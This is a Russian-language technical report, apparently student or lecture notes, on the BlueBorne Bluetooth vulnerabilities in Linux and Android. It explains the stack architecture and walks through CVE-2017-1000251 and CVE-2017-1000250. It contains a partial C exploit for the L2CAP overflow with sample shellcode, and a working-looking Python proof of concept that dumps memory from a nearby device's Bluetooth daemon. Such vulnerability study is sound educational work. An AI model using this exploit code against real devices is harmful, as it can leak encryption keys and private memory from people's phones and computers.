# Введение
TODO: types of vulnerabilities, popular vulnerabilities, impact on android

**Remote control execution (RCE)** - уязвимость, при которой происходит удаленное выполнение кода на взламываемом компьютере или устройстве. Является одной из самых опасных уязвимостей.

# 1.1 Краткое введение в Bluetooth
-------------------------------
Многие сетевые протоколы предоставляют каналы связи для коммуникации и оставляют их использование на усмотрение пользователей. В противоположность этому Bluetooth предоставляет специальные приложения - **профили (profiles)**. И для каждого из них предоставляет свой набор протоколов. Это очень усложняет архитектуру Bluetooth ввиду того, что всего профилей более 30.

Как показано на рисунке 1.1 вся структура Bluetooth протоколов является некой альтернативой стека TCP/IP, начиная с физического уровня и заканчивая прикладным, следуя при этом модели OSI.

![](https://s141man.storage.yandex.net/rdisk/f6156f4c8e2f92e69e0f3f40199ae1b7056686ea9386fc0177103a0cd1da8045/5ecb0ed6/VjhUqhsAETQC8mIPmDmVvWi3M0F4HFleJ6fyUNaxALVK4UtjH3erI77BrphChvALB5kOKZjGGn5_T521F89gpw==?uid=1040559485&filename=9-0.jpg&disposition=inline&hash=&limit=0&content_type=image%2Fjpeg&tknv=v2&owner_uid=1040559485&fsize=64601&etag=d785284f121d037b935bf035da42f2df&media_type=image&hid=445c17ac9306e025624840c78b5bc8e7&rtoken=zSK1kzo3CBFu&force_default=yes&ycrid=na-639f4aa3315b4b9d8a95067c339cd28d-downloader17f&ts=5a66deb20e180&s=8121624591afbfdca66e243438cac9129e8a1d08d3a318a7b719a69742351428&pb=U2FsdGVkX1_nURZkgGO6KfYEl6px7bPpvTBfI_OIQGPPbaQt7olfxZNcbXGvw8pg0el5U2JhZzbO6UUgYS-ezhDID1Yyh4zNoil66mujDmA)
**Рисунок 1.1.1** архитектура стека Bluetooth протоколов

Чем ниже протокол - тем ближе он расположен к физическому уровню. Самые нижние уровни реализованы на контроллерах Bluetooth. Эти чипы взаимодействуют с ОС через интерфейс контроллера (**HCI**). Все протоколы выше **HCI** (например *L2CAP*, *SMP*, *SDP*) реализованы на уровне ОС и входят в отдельный стек Bluetooth конкретной ОС (иногда туда может входить и **HCI**). Профили на рисунке 1.1.1 представлены белым цветом и могут использовать часть стека протоколов для своих целей. Так как каждая ОС использует только собственный стек протоколов Bluetooth, то любая уязвимость, найденная в этом стеке затрагивает все устройства с этой ОС. Например, Linux и ранние версии Android используют стек *BlueZ*. Начиная с версии 4.2 Android использует свой собственный стек *Bluedroid*.

**BlueBorne** представляет собой несколько уязвимостей разных ОС на отдельных уровнях иерархии Bluetooth. В своем докладе я затрагиваю уязвимости Android и Linux (так как *BlueZ* ранее использовался в Android). На рисунке 1.1.2 показаны уровни, на которых обнаружены данные уязвимости.

![](https://s58vla.storage.yandex.net/rdisk/91f7720958f3e9ecc789f14d36fc6d4ab1942f5fb14ca6af181a0b71f7b15147/5ecb0f06/VjhUqhsAETQC8mIPmDmVvSVe9WY5_j_kRagJoJ8NNGMqtSBNjfxEEXoNbYu-sAXjOu56ky8T7tmtNhLFSuuKsA==?uid=1040559485&filename=image--013.jpg&disposition=inline&hash=&limit=0&content_type=image%2Fjpeg&tknv=v2&owner_uid=1040559485&fsize=112968&media_type=image&etag=6432896b8aa4b7b82fc66ba09f40eacc&hid=e954b81d4140c54053a026302e433d39&rtoken=nPq0UdEeUiwM&force_default=yes&ycrid=na-d218b143c44296efaefdebc603799bda-downloader3h&ts=5a66dedee0b40&s=727c960f944ea3042ee6d3e475681c9640bd9c45c1ac5ac1618835eeb668310c&pb=U2FsdGVkX1886wvzeWy6edif87sfimlD9cDe0tEHFMWZ6hlhRlkwCnNqX0iSB8JPPgEYlVFGnLuG5Za3CHbrBhh1rZWtGuxbguc7lUA__qo)
**Рисунок 1.1.2** уровни стека Bluetooth, в которых найдены уязвимости

Кратко о каждом затронутом уровне:
- **L2CAP** - протокол транспортного уровня. Обеспечивает согласование **MTU** (максимальный размер полезного блока данных одного пакета), порядка следования пакетов и, при необходимости, надежность доставки.
- **SDP** - протокол обнаружения сервисов и приложений, которые поддерживаются Bluetooth устройством.
- **BNEP** - протокол инкапсуляции (обычно IP пакетов) поверх Bluetooth. Может, например, использоваться при раздаче интернета через Bluetooth.
- **PAN** - профиль, который использует **BNEP** для создания IP сетей поверх Bluetooth.

Более подробно о каждом уровне в разделах, описывающих уязвимости. 

# 1.2 Обзор Bluetooth стека в Android
--------------------------------
Пользовательское приложение использует Bluetooth процесс через *Binder* (специальную службу в Android, обеспечивающую межпроцессное взаимодействие). Java Native Interface (**JNI** - вызов кода на C/C++ из Java) используется Bluetooth процессом для взаимодействия с низкоуревневым Bluetooth стеком. Рисунок 1 объясняет реализацию Bluetooth в Android.

![](https://s313man.storage.yandex.net/rdisk/8cfee0eb4ff8daafa3d1fe98a8a11ffbe4a0ff7370490391d4910e9295ecbd26/5ecb0eb4/VjhUqhsAETQC8mIPmDmVvSsGxaJTp7BGKDTbHC4TO4leCCHblS7Qn-YXyBLZdnhnOFlHAWMwaie0JAfQA6WFBQ==?uid=0&filename=ape_fwk_bluetooth.png&disposition=inline&hash=&limit=0&content_type=image%2Fpng&tknv=v2&owner_uid=1040559485&media_type=image&fsize=40617&etag=bb84bb573d3272eb0df245ddbc577700&hid=f9a1d84542715f3826d6e1403a4ebc9b&rtoken=P6XzP6h60Nyu&force_default=no&ycrid=na-23857bf31e92759e5b5fe815f51ea3f0-downloader17f&ts=5a66de91a1500&s=384bcbdb59fd4e2107ee5c4b4761894d278ee56186dcdd7c546e320900deec64&pb=U2FsdGVkX19_z5Gj996hyBRg0io6qw6eyAR_TtrRYW6haYX0DcbC_lUrY7J5oADU5UNyLuFNG-SarHeXkdOxj3t3g4ERhUOgV-letePQYb0)

***Рисунок 1.2.1*** архитектура Bluetooth стека в Android
     
- **Application framework** - пользовательское приложение, использующее библиотеку *android.bluetooth* и механизм *Binder*
- **Bluetooth system service** - служба Bluetooth, расположенная в *packages/apps/Bluetooth* как отдельное приложение. Взаимодействует с уровнем **HAL** через **JNI**
- **JNI** - код на С/C++, расположенный в *packages/apps/Bluetooth/jni* (как раз представляет собой библиотеку *android.bluetooth*). Когда выполняется какая-либо Bluetooth операция, например обнаруживается новое Bluetooth устройство,  ожидает выполнения специальных функций-коллбэков из уровня **HAL**
- **Hardware abstraction level (HAL)** - более близкий к аппаратной части уровень. Предназначен для связи ядра Android c аппаратной частью Bluetooth стека. Реализовывает специальный интерфейс, который используется *android.bluetooth*.
- **Bluetooth stack** - реализация стека протоколов Bluetooth, расположен в *system/bt*. Расширяет уровень **HAL** дополнительными модулями и конфигурациями.
- **Vendor extensions** - может быть добавлен вендором (компанией, которая выпускает конкретный девайс) для реализации командного интерфейса контроллера (драйвера **HCI**).

# 2.1 L2CAP и уязвимость BlueZ стека Linux
----------------------------------------
### Обзор L2CAP

На стороне ОС это самый нижний уровень иерархии Bluetooth. L2CAP отвечает за связь между различными сервисами (протоколами) Bluetooth стека. Инкапсулирован в транспортный протокол **ACL** (предоставляет **chanel IDs**, далее **CIDs**, аналоги портов в UDP или TCP, куда передаются пакеты, но не предоставляет надежности доставки). Спецификация Bluetooth может резервировать некоторые **CIDs** для своих целей. Другие **CIDs** присваиваются динамически. Например, если некоторая конечная точка хочет послать сообщение какому-то Bluetooth сервису, ей будет динамически выделен свой **CID**.

Во время создания нового L2CAP соединения, две конечные точки пытаются достичь согласования (по пропускной способности и иным параметрам), обмениваясь специальными пакетами, **запросом** и **ответом** конфигурации. Запрос конфигурации содержит  параметры, по которым можно сказать о типе используемого соединения.

### Процесс обмена конфигурациями

В документации Bluetooth запросы и ответы конфигурации обозначены как **L2CAP_ConfReq** и **L2CAP_ConfResp** сообщения. Начальный обмен этими сообщениями между конечными точками называется **инициализирующим рукопожатием**. *L2CAP_ConfResp* содержит статус-код, который информирует отправителя о том, приняты ли его параметры конфигурации, или в этом отказано. 
![](https://s426sas.storage.yandex.net/rdisk/145c9c9b5bd4646a74e40def7dd1b7db52f0519926a18027d4b6d7dd5b3edfa7/5ecb0f6a/VjhUqhsAETQC8mIPmDmVvSyhKRGbhB5iP6-Vw5bQ7hnQLdPFg_SR_W3tLW7L1znlpRccNWJUJhPkSejmCSMxSA==?uid=1040559485&filename=image--017.jpg&disposition=inline&hash=&limit=0&content_type=image%2Fjpeg&tknv=v2&owner_uid=1040559485&fsize=83232&etag=a9eff1fa0e3b223ff82729fa892595ff&hid=7b142acf5260421972b0b442be49b52c&media_type=image&rtoken=4DE60t6AwB4m&force_default=yes&ycrid=na-b33eae45a796ad319003dec5b2ea6f2f-downloader17f&ts=5a66df3e3ec40&s=819c7b8dc84fa2b01fdf14b7463666da2be1a0d5a7bbe15e4460764203f2c0b3&pb=U2FsdGVkX18DS_ffJxVM_fIFC25Y2XvXj9Wj1SQ3FeXHeE-WhBgAKkzT4tePa5RfhXvraDQNiMMjIghVdzgfK85uZb6JShWB5gi8UTv7l5I)
**Рисунок 2.1.1** типичный процесс обмена конфигурацией. В данном примере две конечные точки обмениваются информацией об **MTU** (максимальный размер полезного блока данных одного пакета). Остальные параметры выставлены по умолчанию.

Рисунок 2.1.1 иллюстрирует процесс обмена конфигурациями. Девайс **А** запрашивает **MTU** как параметр (*option = 0x01*) и его величину *0x100*, которую девайс **B** принимает и затем запрашивает величину **MTU** как *0x200*, которую девайс **A** также принимает. Таким образом, максимальная величина сообщения, которое устройство **А** может послать устройству **B** составляет *0x100* и обратно от **B** к **A** *0x200*. 

В отличие от вышеприведенного примера, устройство может отклонить параметры, которые ему не подходят. Чтобы облегчить дальнейший обмен конфигурациями, его ответ может содержать альтернативные, приемлимые для себя параметры. Следующая выдержка кода из ядра Linux отражает этот момент. Изначально **MTU** инициализировано по умолчанию.
```c++
// если запрошенный MTU меньше 
// чем минимальный по умолчанию
if (mtu < L2CAP_DEFAULT_MIN_MTU)
    // отбрасываем
	result = L2CAP_CONF_UNACCEPT;
else {
    // присваиваем MTU каналу
	chan->omtu = mtu;
	// заканчиваем настройку MTU
	set_bit(CONF_MTU_DONE, &chan->conf_state);
}
// добавляем настройки конфигурации
l2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, chan->omtu, endptr - ptr);
```
Выдержка из исходного кода функции **l2cap_parse_conf_req** (*net/bluetooth/l2cap_core.c*)

Таким образом, если предложенное значение **MTU** нам не подходит, в настройки конфигурации войдет значение по умолчанию (мы предложим свое значение). Таким образом процесс обмена конфигурациями продолжится, пока стороны не придут к взаимовыгодным параметрам соединения.

Существует иной механизм процесса обмена конфигурациями для более отказоустойчивого соединения под названием **Extended Flow Specification (EFS)**. Все **EFS** параметры должны быть перепроверены каждой конечной точкой соединения. Поэтому ответ от устройства на конфигурационный запрос может быть **"в ожидании" (pending)**, так как оно не до конца проверило все **EFS** параметры, что будет использовано в уязвимости. После того, как устройства обменялись всеми **EFS** параметрами, стороны достигнут взаимного соглашения.

### RCE уязвимость ядра Linux (CVE-2017-1000251) 

Данная уязвимость затрагивает BlueZ стек ядра Linux, а конкретно реализацию механизма **EFS** протокола L2CAP в функции *l2cap_parse_conf_rsp*. 
Первая ее часть приведена в следующей выдержке.
```c++
static int l2cap_parse_conf_rsp(struct l2cap_chan *chan, void *rsp, int len,
void *data, u16 *result)
{
    // rsp - указатель на буфер в котором 
    // находится конфигурационный ответ
    // len - его длина
    // data - указатель на буфер
    // в который помещаются параметры после проверки
    struct l2cap_conf_req *req = data;
    void *ptr = req->data;
    // ...
    while (len >= L2CAP_CONF_OPT_SIZE) {
        // получаем в цикле элементы из буфера rsp
        len -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);
        switch (type) {
            case L2CAP_CONF_MTU:
                // проверяем MTU
                l2cap_add_conf_opt(&ptr, L2CAP_CONF_MTU, 2, chan->imtu);
                break;
            case L2CAP_CONF_FLUSH_TO:
                chan->flush_to = val;
                l2cap_add_conf_opt(&ptr, L2CAP_CONF_FLUSH_TO, 2, chan->flush_to);
                break;
            // и другие параметры
        }
    }
    // ...
    return ptr - data;
}
```
Выдержка из исходного кода функции **l2cap_parse_conf_rsp** (*net/bluetooth/l2cap_core.c*)

Функция получает конфигурационный ответ в буфере на который указывает ***rsp*** и в цикле получает по одному каждый конфигурационный параметр, используя **l2cap_get_conf_opt**. Каждый полученный элемент проверяется и записывается обратно через указатель ***ptr*** (поле *data* в структуре *l2cap_conf_req*) в буфер ответа, на который указывает ***data***. Здесь важно заметить, что длина буфера ***data*** в функцию не передается.

Размер приходящего ответа никак не ограничен, что позволяет атакующей стороне прислать ответ ***rsp*** в котором могут быть дупликаты. Как результат, все содержимое ***rsp*** (включая возможные дупликаты) скопируются в буфер ***data***. Функция в которой формируется ***data*** (**l2cap_parse_conf_rsp**) вызывается из двух мест в **l2cap_config_rsp**, которая обрабатывает сообщения ответов конфигурации. Эти два места похожи, поэтому оба могут использоваться при эксплуатации уязвимости. Первый фрагмент такого участка представлен на следующей выдержке исходного кода.

```c++
switch (result) {
    case L2CAP_CONF_SUCCESS:
        ...
        break;
    case L2CAP_CONF_PENDING:
        // если устройство в состоянии "ожидание"
        set_bit(CONF_REM_CONF_PEND, &chan->conf_state);
        if (test_bit(CONF_LOC_CONF_PEND, &chan->conf_state)) {
            char buf[64];
            // buf передается как буфер data
            // rsp->data в качестве rsp
            len = l2cap_parse_conf_rsp(chan, rsp->data, len, buf, &result);
        ...
        goto done;
```
Выдержка из исходного кода функции **l2cap_config_rsp** (*net/bluetooth/l2cap_core.c*)

*switch* проверяет значение, которое было было получено из ответа конфигурации, что может управляться атакующим. Далее роль ***data*** будет играть ***char buf[64]***. Данный участок кода исполнится только если устройство будет в состоянии "в ожидании", что может быть спровоцировано следующим фрагментом кода.
```c++
if (remote_efs) {
    if (chan->local_stype != L2CAP_SERV_NOTRAFIC &&
        // поле которое используется в дальнейшем
        efs.stype != L2CAP_SERV_NOTRAFIC &&
        efs.stype != chan->local_stype) {
        ...// эта ветвь не используется
    } else {
        // посылаем конфигурационный ответ "в ожидании"
        result = L2CAP_CONF_PENDING;
        set_bit(CONF_LOC_CONF_PEND, &chan->conf_state);
    }
}
```
Выдержка из исходного кода функции **l2cap_config_rsp** (*net/bluetooth/l2cap_core.c*)

Отсюда следует, что для перехода устройства в состояние "в ожидании" достаточно послать конфигурационный запрос с **EFS** опцией, выставив поле ***stype*** в *L2CAP_SERV_NOTRAFIC*.

После того, как мы достигли состояния жертвы "в ожидании", буфер ***buf[64]*** может быть произвольно перезаписан и передан в функцию **l2cap_parse_conf_rsp**. Эта уязвимость позволяет атакующему совершить переполнение буфера ***buf*** неограниченным количеством данных.

### Как работает переполнение буфера

Пусть у нас есть следующий фрагмент кода.
```c++
#include <string.h>

int main(int argc, char *argv[]) {
	char buf[100];
	strcpy(buf, argv[1]);
	return 0;
}
```
При передаче в ***argv[1]*** строки, превышающего по длине размер массива ***buf***, произойдет переполнение буфера, как показано на рисунках 2.1.2 и 2.1.3, так как функция **strcpy** не проверяет размер переданной ей строки. 
![](https://s87myt.storage.yandex.net/rdisk/0b335cb53225296e5874311b9047489d8ef810a3e24f874b2af78b7f403e877b/5ecb0f9a/IkFTLqauHgYU-Cdk6fB83NuXuDR_mUJM1xg80h0saK-eZa2DiUBWdIjtnE4oxYqdEsNlP5S2Y4efLJxj-B_cnw==?uid=1040559485&filename=Stack_Overflow_2.png&disposition=inline&hash=&limit=0&content_type=image%2Fpng&tknv=v2&owner_uid=1040559485&media_type=image&hid=8d9976c57c7bb5fe0e56348d7382bb67&etag=4ef6720136b3fd87f130320aa644e6c1&fsize=39254&rtoken=gBL5cjoHjJgX&force_default=yes&ycrid=na-13dd3e1f1bd1a70aba0dc4e1ee0c0f6b-downloader17f&ts=5a66df6c05840&s=19eedd459bac2007ce816214e9f8e2ff13449a923d71e37b7cbb29ce8232e594&pb=U2FsdGVkX19QVH3L72wqsdBzAfFpjVa-caUj2Wew-m7avmgR4QpEv0VxoN-IbJUJX-XwCS7S8Zhej2nmgDWx0n8TpZNF9NJo6gVVJ9Hrbso)
**Рисунок 2.1.2** до копирования
![](https://s610sas.storage.yandex.net/rdisk/cfe38025005d54ba01927309fcdb5f02e13a05f17dcbc08e8f0da2b12fc05f04/5ecb0fab/IkFTLqauHgYU-Cdk6fB83DbTa9cOE3YFLBQeo1y50Exj3m2jXN5WAOq1ueHn60STO2uiSDGALMB6_HmX9FkDBw==?uid=1040559485&filename=Stack_Overflow_4.png&disposition=inline&hash=&limit=0&content_type=image%2Fpng&tknv=v2&owner_uid=1040559485&media_type=image&etag=33535dd06eb993dc7de54894d1e1af59&fsize=42327&hid=6abb0689bd418d7dedede9d50c7ad4b3&rtoken=cpTgr3kWGtiu&force_default=yes&ycrid=na-13f19702116788c23efae09c55fb90d5-downloader17f&ts=5a66df7c3be80&s=d04591601a53431b6eab739cce20a58727895df1557a648defd4e529b69103c1&pb=U2FsdGVkX19yIK6vN13uu7slcTG4gf2FSG9YVzOrCM0J-k47-mtRcPz0G3n9OBbG67gD8aNEMIa5Xb-kGpezC-kaLYbIJuEg8rzsZPUf0OY)
**Рисунок 2.1.2** после копирования
Так как в архитектуре x86 стек растёт от больших адресов к меньшим, то, записывая данные в буфер, можно осуществить запись за его границами и изменить находящиеся там данные, в частности, изменить адрес возврата.
Таким образом, атакующая сторона может:
- перезаписать локальную переменную, находящуюся в памяти рядом с буфером, изменяя поведение программы в свою пользу
- перезаписать адрес возврата в стековом кадре. Как только функция завершается, управление передаётся по указанному атакующим адресу, обычно в область памяти, к изменению которой он имел доступ
- перезаписать указатель на функцию или обработчик исключений, которые впоследствии получат управление
#### Эксплуатация уязвимости CVE-2017-1000251
В данном разделе я привожу объяснение возможного использования CVE-2017-1000251.
Для простоты целью данного примера является исполнение следующего шелл-кода.
```asm
push 0x00433601 ; 0x43 - символ 'C'
push esp
mov ecx,esp
mov eax,0xc1107803 ; 0xc1107803 - print_k
call eax
mov ebx, 0x4
mov eax, 0xc109ec30 ; 0xc109ec30 - msleep_interruptible()
call eax
```
То есть этот фрагмент выводит в логи ядра символ 'C'
Перед исполнением нужно отключить stack-protector и ASLR (рандомизацию адресного пространства). Также нужно знать **BD_ADDR** (MAC-aдрес устройства жертвы).
Для конструирования **L2CAP** пакета, узнаем вначале свой **BD_ADDR** и запишем оба адреса в соответствующие структуры:
```c++
struct hci_dev_info di;
hci_devinfo(0, &di); // BD_ADDR теперь в di.bdaddr

struct sockaddr_l2 laddr, raddr;
// конструирование локального адреса
laddr.l2_family = AF_BLUETOOTH;
laddr.l2_bdaddr = di.bdaddr;
laddr.l2_psm = htobs(0x1001);
laddr.l2_cid = htobs(0x0040);

// конструирование адреса жертвы
memset(&raddr, 0, sizeof(raddr));        
raddr.l2_family = AF_BLUETOOTH;
str2ba(remote_address, &raddr.l2_bdaddr);
```
Откроем Bluetooth-сокет и привяжемся к нему:
```c++
// создание сокета	
int sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);

// привязка к созданному сокету
bind(sock, (struct sockaddr *) &laddr, sizeof(laddr));

// установление соединения
connect(sock, (struct sockaddr *) &raddr, sizeof(raddr));
```
Сформируем первый **L2CAP** пакет и отправим его:
```c++
buf = (char *) malloc (L2CAP_CMD_HDR_SIZE ));

//выставление настроек опций в заголовке L2CAP 
cmd = (l2cap_cmd_hdr *) buf;
cmd->code = 0x02;
cmd->ident = 0x03;
cmd->len = htobs(4);

// первый 0x00 - L2CAP_SERV_NOTRAFIC
char payload2[]="\x01\x00\x40\x00";
memcpy((buf + L2CAP_CMD_HDR_SIZE), payload2, 4);

// отправление пакета
send(sock, buf, L2CAP_CMD_HDR_SIZE + 4, 0)

```
TODO: code + conclusions
#### Выводы

В случае с BlueZ, уровень **L2CAP** включен в ядро Linux. Это решение не самое удачное в силу таких механизмов как **EFS**, потому что внедренный вредоносный код будет иметь наибольшие привилегии, что может привести к разрушительным последствиям. Это дает надежный эксплойт для атакующей стороны, требуется только включенный Bluetooth и информация о MAC-адресе жертвы.

# 2.2 SDP и уязвимости Bluetooth стеков  Linux и Android (CVE-2017-1000250 и CVE-2017-0785) 
--------------------------------------
#### Обзор SDP

Назначение протокола **SDP** (**service discovery protocol**) заключается в том, чтобы позволять устройствам Bluetooth понимать, какие сервисы и приложения (или устройства вокруг) поддерживают Bluetooth. Использует клиент-серверную модель.

Для того, чтобы получить информацию об определенном сервисе, *SDP клиент* посылает **SDP-запрос** *SDP-серверу* и ожидает **SDP-ответ**. Для этого процесса **SDP** определяет особый механизм фрагментации (**SDP-continuation**). Он состоит в следующем:
- *SDP клиент* посылает *SDP-запрос*
- Если ответ на этот запрос превышает значение **MTU** (максимальный размер полезного блока данных одного пакета) для установленного **L2CAP** соединения, вернется только часть ответа, а перед *SDP-ответом* будет выставлено поле **continuation-state**
- Чтобы получить остальные фрагменты ответа, *SDP-клиент* пошлет тот-же самый *SDP-запрос* еще раз,  но в этот запрос также выставит поле **continuation-state**
- *SDP-сервер* пришлет следующий фрагмент ответа
- предыдущие шаги будут повторяться, пока клиент не получит ответ целиком

Важно заметить, что спецификация Bluetooth оставляет реализацию **continuation-state** за каждым *SDP-сервером*. И возвращенное поле **continuation-state** никак не используется *SDP-клиентом* напрямую (клиент должен посылать это поле неизмененным). Это лежит в основе двух уязвимостей утечки информации в Bluetooth стеках Linux и Android.

#### Уязвимость утечки информации в BlueZ стеке Linux (CVE-2017-1000250)
Данная уязвимость возникает из-за ошибки в реализации механизма фрагментации протокола **SDP**. BlueZ определяет **continuation-state** как:
```c++
typedef struct {
    // может также послужить утечкой
    // о времени на конкретном устройстве
    uint32_t timestamp; 
    union {
        uint16_t maxBytesSent;
        // индекс показывает сколько
        // байтов прислали
        uint16_t lastIndexSent;
    } cStateValue;
} sdp_cont_state_t;
```
Структура **continuation-state** из исходного кода BlueZ (src/sdpd-request.c)

Так как *SDP клиент* постоянно должен вставлять эту структуру перед тем, как хочет получить очередной фрагмент ответа, он может подменить поле **lastIndexSent**, что может повлечь за собой чтение данных, находящихся за пределами буфера, в котором хранится *SDP-ответ*, что следует из обработчика запроса, приведенного далее:
```c++
...
    } else {
        //cstate - continuation-state 
        sdp_buf_t *pCache = sdp_get_cached_rsp(cstate);
        if (pCache) { 
            // получено continuation-state
            // из ответа в кэше
            uint16_t sent = MIN(max, pCache->data_size -
cstate->cStateValue.maxBytesSent);
            pResponse = pCache->data;
            //копируются данные, находящиеся в ответе
            memcpy(buf->data, pResponse + cstate->cStateValue.maxBytesSent, sent);
            buf->data_size += sent;
            cstate->cStateValue.maxBytesSent += sent;
            //если отправили все фрагменты пакета
            if (cstate->cStateValue.maxBytesSent == pCache->data_size)
                //размер выставляется в нуль
                cstate_size = sdp_set_cstate_pdu(buf, NULL);
            else
                //размер выставляется такой же как и у cstate
                cstate_size = sdp_set_cstate_pdu(buf, cstate);
        } else {
            status = SDP_INVALID_CSTATE;
            SDPDBG("Non-null continuation state, but null cache buffer");
        }
    }
...
```
Выдержка из функции service_search_attr_req исходного кода *SDP-сервера* BlueZ (src/sdpd-request.c)

На данном участке кода *SDP сервер* некорректно проверяет поле **maxBytesSent** из структуры **continuation-state** (переменная *cstate*), что позволяет вышестоящему вызову функции **memcpy** скопировать данные, находящиеся за пределами буфера *pResponse*. Атакующей стороне остается лишь обойти этот некорректный **if(...)**, который проверяет, что все данные были отправлены. Этого легко достичь, так как клиент имеет доступ к полю **maxBytesSent** структуры **continuation-state**.

BlueZ стек разбит на две части, одна из которых работает на *уровне ядра* (отрывок был рассмотрен в уязвимости **L2CAP**), вторая - на *пользовательском уровне*. Процесс *bluetoothd* как раз содержит последнюю часть и контролирует критически важные данные (например ключи шифрования Bluetooth-соединений), которые могут быть получены при эксплуатации данной уязвимости. Данная утечка очень напоминает **Heartbleed (CVE-2014-0160)** - ошибку в криптографическом программном обеспечении *OpenSSL*, позволяющую несанкционированно читать память на сервере или на клиенте, в том числе для извлечения закрытого ключа сервера.

#### Эксплуатация уязвимости CVE-2017-1000250
Данный пример на языке python для простоты показывает только, как можно получить данные за пределами выделенного буфера, никак при этом их не используя.

Определим сначала нужные структуры данных (в классе scapy.packet.Packet уже определены специальные методы и поля для удобного конструирования пакетов):
```python
# собственная реализация Bluez continuation state 
# (приведена в разделе выше)
class BlueZ_ContinuationState(Packet):
    fields_desc = [
        LEIntField("timestamp", 0),
        LEShortField("maxBytesSent", 0),
        LEShortField("lastIndexSent", 0),
    ]

# собственная реализация SDP-запроса поиска поддерживаемых сервисов
# содержит id необходимого нам сервиса и список параметров,
# которые требуется от него получить
class SDP_ServiceSearchAttributeRequest(Packet):
    fields_desc = [
        # id SDP протокола
        ByteField("pdu_id",0x06),
        # id транзакции
        ShortField("transaction_id", 0x00),
        # длина параметров
        ShortField("param_len", 0),
        # id сервиса/сервисов
        FieldListField("search_pattern", 0x00, ByteField("", None)),
        # максимальное количество байтов, которое хотим получить в ответе
        ShortField("max_attr_byte_count", 0),
        # список параметров
        FieldListField("attr_id_list", 0x00, ByteField("", None)),
        # длина continuation state 
        ByteField("cont_state_len", 0),
    ]
```
Установим **L2CAP** соединение и согласуем значение **MTU**. Так как относительно **SDP** это низлежащий протокол, воспользуемся готовой реализацией  **L2CAP** из python-библиотеки *bluetooth*:
```python
# получим BD_ADDR (MAC-aдрес устройства жертвы) из аргументов
# выберем значение MTU как 512 байтов 
target = sys.argv[1]
mtu = 512

# создадим L2CAP-сокет и установим соединение
print("Connecting L2CAP socket...")
sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
bluetooth.set_l2cap_mtu(sock, mtu)
sock.connect((target, 1))
```
Отправим первый *SDP-пакет* для получения метки времени на устройстве-жертвы:
```python
# search-pattern и attr_id_list такие для примера
# изменяя эти значения, можно получать данные от различных Bluetooth-сервисов
req1 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                            attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                            max_attr_byte_count = 10)
sock.send(bytes(req1))
resp1 = sock.recv(mtu)

# обработка полученного continuation-state
cont_state = resp1[-8:]
host_timestamp = int.from_bytes(cont_state[:4], byteorder = 'little')
print("Extracted timestamp:", hex(host_timestamp))
```
После этого отправляем *SDP-пакеты* с подмененным **continuation-state**:
```python
received_data = b''
offset = 65535

print("Dumping", offset, "bytes of memory...")
while offset > 0:
    print("Sending SDP req, offset:", offset)
    req2 = SDP_ServiceSearchAttributeRequest(search_pattern = [0x35, 0x03, 0x19, 0x01, 0x00],
                                attr_id_list = [0x35, 0x05, 0x0a, 0x00, 0x00, 0x00, 0x01],
                                max_attr_byte_count = 65535)
    # подмена continuation-state (используется подмена поля maxBytesSent)
    # за счет такой подмены двигаем границы передаваемого нам буфера
    forged_cont_state = BlueZ_ContinuationState(timestamp = host_timestamp, 
                                maxBytesSent = offset) 
    # записываем в пакет подмененное continuation-state
    req2 = req2 / forged_cont_state
    # отправляем пакет
    sock.send(bytes(req2))

    data = sock.recv(mtu)
    data = data[7:] # убираем SDP параметры
    data = data[:-9] # убираем continuation state
    # сохраняем полученные данные 
    received_data = data + received_data
    # двигаем смещение
    offset -= len(data) if len(data) > 0 else 1

print(hexdump(received_data))
```
Полученные байты хранятся в массиве *received_data*
